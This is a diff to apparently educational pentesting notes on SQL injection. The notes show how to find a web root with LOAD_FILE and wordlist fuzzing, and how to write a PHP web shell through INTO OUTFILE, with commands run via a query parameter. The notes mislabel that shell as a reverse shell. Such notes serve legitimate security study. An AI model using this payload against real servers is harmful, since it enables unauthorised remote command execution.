@@ -366,8 +366,9 @@ SELECT 'This is text' INTO OUTFILE 'path/to/file';
 ```
 
 The location we want to write to is usually the root directory of the web server. This is to ensure it is executed, and can be reached easily from a browser.
-> To find the root directory:
-* Use the `LOAD_FILE` command to read the server configuration. Its location is dependant on the system.
+
+To find the root directory:
+* Use the `LOAD_FILE` command to read the server configuration. Its location is dependent on the system.
 * Use fuzzing attack to write files to different web roots, and see which one works:
 	* `/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt`
 	* `/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt`
@@ -381,9 +382,8 @@ We can then write it using the above syntax:
 ```SQL
 SELECT '<?php echo system($_GET["command"]); ?>' INTO OUTFILE '/root-directory/shell.php'
 ```
-
-> Visiting the website with `/shell.php` at the end opens the reverse shell.
-> Entering commands as a query parameter with name `command` exectues them.
+- Visiting the website with `/shell.php` at the end opens the reverse shell.
+- Entering commands as a query parameter with name `command` executes them.
  
 ```
 /shell.php?command=<enter-here>
